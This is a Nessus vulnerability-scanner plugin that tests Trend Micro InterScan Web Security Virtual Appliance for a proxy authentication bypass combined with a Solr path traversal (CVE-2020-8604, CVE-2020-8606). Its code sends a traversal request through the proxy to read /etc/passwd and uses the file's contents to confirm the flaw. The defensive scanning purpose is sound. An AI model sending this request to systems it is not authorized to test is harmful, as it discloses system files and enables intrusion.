include("compat.inc");
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(139030);
  script_version("1.4");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/04");

  script_cve_id("CVE-2020-8604", "CVE-2020-8606");
  script_xref(name:"ZDI", value:"ZDI-20-677");
  script_xref(name:"ZDI", value:"ZDI-20-678");

  script_name(english:"Trend Micro InterScan Web Security Virtual Appliance (IWSVA) Multiple Vulnerabilities (000253095)");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running an application that is affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The Trend Micro InterScan Web Security Virtual Appliance is affected
by multiple vulnerabilities :

  - A path traversal vulnerability exists in the Apache Solr
    application due to improper validation of a user-supplied path
    prior to using it in file operations when parsing the file
    parameter in an HTTP request. An unauthenticated, remote
    attacker (when combined with CVE-2020-8606) can exploit this, by
    sending a URI that contains path traversal characters, to
    disclose the contents of arbitrary files. (CVE-2020-8604)

  - An authentication bypass vulnerability exists in the HTTP proxy
    service due to its ability to communicate with internal services
    on the same host. An unauthenticated, remote attacker can exploit
    this, by sending requests through the proxy, to access other
    services that are otherwise inaccessible. (CVE-2020-8606)

Note that the appliance is reportedly affected by other
vulnerabilities; however, this plugin has not tested for those issues.");
  # https://success.trendmicro.com/solution/000253095
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?afd49bf5");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the IWSVA version 6.5 build 1901 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2020-8606");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Trend Micro Web Security (Virtual Appliance) Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2020/05/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2020/05/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/07/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:trendmicro:interscan_web_security_virtual_appliance");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Firewalls");

  script_copyright(english:"This script is Copyright (C) 2020-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("trendmicro_iwsva_detect.nbin", "proxy_use.nasl");
  script_require_keys("installed_sw/Trend Micro IWSVA Web UI");
  script_require_ports("Services/http_proxy", 8080);

  exit(0);
}

include('http.inc');
include('install_func.inc');
include('debug.inc');

app = "Trend Micro IWSVA Web UI";

# Exit if IWSVA is not detected on the target
get_install_count(app_name:app, exit_if_zero:TRUE);

# Attack through the proxy
port = get_service(svc:'http_proxy', default:8080, exit_on_fail:TRUE);

# The firewall on the IWSVA host blocks this port from external access.
# It can only be accessed internally via the http proxy.
solr_port = 8983;

# File to get fetch and content to check in the response.
chk.file = '/etc/passwd';
chk.res  = 'root:x:0:0:root:/root:/bin/bash';

url = 'http://' + get_host_ip() + ':' + solr_port 
  + '/solr/collection0/replication'
  + '?command=filecontent'
  + '&wt=filestream'
  + '&generation=1'
  + '&file=../../../../../../../../' + chk.file;

res = http_send_recv3(
  method        : "GET",
  port          : port,
  item          : url,
  exit_on_fail  : TRUE
);

# Patched
if ('Self-referential requests to proxy are forbidden' >< res[2])
  audit(AUDIT_HOST_NOT, 'affected');
# Vulnerable
else if(chk.res >< res[2])
{
  line_limit = 10;
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report = 'Nessus was able to exploit the issues with the following request : ' +
  '\n\n' +  http_last_sent_request() +  
  '\n\n' + 'This produced the following truncated output (limited to ' +
  line_limit + ' lines) :' +
  '\n' + snip +
  '\n' + beginning_of_response2(resp:substr(res[2], 4), max_lines:line_limit) +
  '\n' + snip +
  '\n';

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    extra       : report
  );
}
# Unexpected
else
{
  dbg::log(msg:res[0] + res[1], ddata:res[2]);
  audit(AUDIT_RESP_BAD, port); 
}
  

